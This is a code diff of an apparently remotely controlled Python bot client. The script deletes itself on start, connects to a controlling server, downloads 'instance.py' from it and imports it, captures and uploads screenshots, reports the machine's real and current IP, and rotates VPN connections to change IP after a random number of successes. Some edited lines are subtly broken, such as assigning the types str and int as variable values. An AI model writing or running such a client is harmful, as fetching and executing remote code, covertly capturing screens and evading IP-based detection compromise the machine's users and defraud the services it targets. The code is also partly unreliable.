@@ -1,17 +1,21 @@
-host_ip, host_port = str, int
-comment = current_ip = last_ip = ''
-BUFFER_SIZE = 1024 * 100
-host_cpu = host_ram = success = failure = uptime = 0
-img_dict = {}
-connection_enabled = True
-total_instances = ['ngrok_direct']
-available_instances = ['ngrok_direct']
-genuine_ip = None
+last_ip, current_ip, genuine_ip, success, img_dict, host_cpu, host_ram, comment, uptime, connection_enabled, host_ip, host_port, BUFFER_SIZE = '','','','','','','','','','','','',''
+available_instances = []
 
-def run(host_ip, host_port, user_id):
+def run(user_data):
     from os import remove
     remove('runner.py')
-    global genuine_ip, success, failure, comment, available_instances, img_dict, host_cpu, host_ram
+
+    global last_ip, current_ip, genuine_ip, success, available_instances, img_dict, host_cpu, host_ram, comment, uptime, connection_enabled, BUFFER_SIZE
+
+    comment, current_ip, last_ip = str, int, str
+    img_dict = {}
+    BUFFER_SIZE = 1024 * 100
+    host_cpu = host_ram = success = uptime = 0
+    genuine_ip = None
+    available_instances = ['ngrok_direct']
+    connection_enabled = True
+    total_instances = ['ngrok_direct']
+
     from PIL import ImageGrab
     from pyautogui import size
     from ping3 import ping
@@ -24,12 +28,9 @@ def run(host_ip, host_port, user_id):
     from threading import Thread
     import socket
 
-    def force_connect_server(type_of_connection):
+    def force_connect_server():
         global host_ip, host_port
-        if type_of_connection == 'tcp':
-            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        else:
-            connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         while True:
             try:
                 connection.connect((host_ip, host_port))
@@ -82,7 +83,7 @@ def run(host_ip, host_port, user_id):
             print(f'{text}-{additional_comment}'.encode())
             ss = ImageGrab.grab().tobytes()
             x, y = size()
-            debug_connection = force_connect_server('tcp')
+            debug_connection = force_connect_server()
             __send_to_connection(debug_connection, b'3')
             __send_to_connection(debug_connection, f'{text}-{additional_comment}'.encode())
             __send_to_connection(debug_connection, str((x, y)).encode())
@@ -162,22 +163,19 @@ def run(host_ip, host_port, user_id):
 
 
     def run_instance(instance_name):
-        global available_instances, success, failure, comment, img_dict
+        global available_instances, success, comment, img_dict
         try:
-            instance_connection = force_connect_server('tcp',)
+            instance_connection = force_connect_server()
             __send_to_connection(instance_connection, b'2')
             __send_to_connection(instance_connection, instance_name.encode())
             open('instance.py', 'wb').close()
             with open('instance.py', 'ab') as instance_file:
                 instance_file.write(__receive_from_connection(instance_connection))
                 instance_file.close()
-            instance_connection.close()
-            del instance_connection
             import instance
-            instance_name, s, f, comment, img_dict = instance.run(host_ip=host_ip, host_port=host_port, img_dict=img_dict, user_id=user_id)
+            instance_name, s, comment, img_dict = instance.run(img_dict=img_dict, u_name=u_name)
             del instance
             success += s
-            failure += f
             available_instances.append(instance_name)
         except Exception as e:
             Thread(target=send_debug_data, args=(repr(e), 'run_instance',)).start()
@@ -195,7 +193,7 @@ def run(host_ip, host_port, user_id):
 
 
     def restart_vpn_recheck_ip(required=False):
-        global current_ip, genuine_ip, last_ip, connection_enabled
+        global current_ip, last_ip, connection_enabled
         _ = 1
         while True:
             update_current_ip()
@@ -204,7 +202,7 @@ def run(host_ip, host_port, user_id):
                     sleep(5)
                     _ += 1
                 else:
-                    vpn_issue_connection = force_connect_server('tcp')
+                    vpn_issue_connection = force_connect_server()
                     __send_to_connection(vpn_issue_connection, b'10')
                     code = __receive_from_connection(vpn_issue_connection)
                     if code == b'rs':
@@ -239,30 +237,34 @@ def run(host_ip, host_port, user_id):
         uptime += f"{int(minutes)}m {int(seconds)}s"
 
 
-
-
     def send_data():
-        send_data_connection = force_connect_server('tcp')
+        send_data_connection = force_connect_server()
         __send_to_connection(send_data_connection, b'100')
-        __send_to_connection(send_data_connection, user_id.encode())
-        send_data_connection.settimeout(60)
+        __send_to_connection(send_data_connection, u_name.encode())
+        send_data_connection.settimeout(20)
         while True:
             try:
-                website_img_size = __receive_from_connection(send_data_connection).decode()
-                if website_img_size == "":
+                received_data = __receive_from_connection(send_data_connection).decode()
+                if received_data == " ":
                     pass
                 else:
                     update_cpu_ram()
                     uptime_calculator()
-                    current_data = {'public_ip': current_ip, 'success': success, 'failure': failure, 'cpu': host_cpu, 'ram': host_ram, 'uptime': uptime}
+                    current_data = {'public_ip': current_ip, 'genuine_ip':genuine_ip, 'success': success, 'cpu': host_cpu, 'ram': host_ram, 'uptime': uptime}
                     __send_to_connection(send_data_connection, str(current_data).encode())
             except:
                 break
         send_data()
 
+    u_name = user_data['u_name']
     __disconnect_all_vpn()
     sleep(3)
     genuine_ip = __get_global_ip()
+    update_user_agents_connection = force_connect_server()
+    __send_to_connection(update_user_agents_connection, b'7')
+    user_agents_data = __receive_from_connection(update_user_agents_connection)
+    with open('user agents.txt', 'wb') as file:
+        file.write(user_agents_data)
     start_time = time()
     Thread(target=restart_if_connection_missing).start()
     Thread(target=send_data).start()
@@ -271,7 +273,7 @@ def run(host_ip, host_port, user_id):
 
     while True:
         while True:
-            if (success + failure >= next_ip_reset) or comment == 'change_ip':
+            if (success >= next_ip_reset) or comment == 'change_ip':
                 restart_vpn_recheck_ip(True)
                 comment = ''
                 next_ip_reset += randrange(1, 3)
